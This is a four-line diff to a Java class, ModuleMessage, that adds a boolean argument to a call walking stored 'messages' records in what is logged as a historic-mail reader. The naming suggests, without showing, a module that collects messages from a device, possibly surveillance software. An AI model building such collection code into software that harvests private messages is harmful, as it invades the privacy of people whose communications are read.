@@ -427,7 +427,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 					// i_2=messages
 					// M.d("messages")
-					int newLastId = (int) helper.traverseRecords("messages", visitor);
+					int newLastId = (int) helper.traverseRecords("messages", visitor, false);
 
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (readHistoricMail) finished, newLastId: " + newLastId);
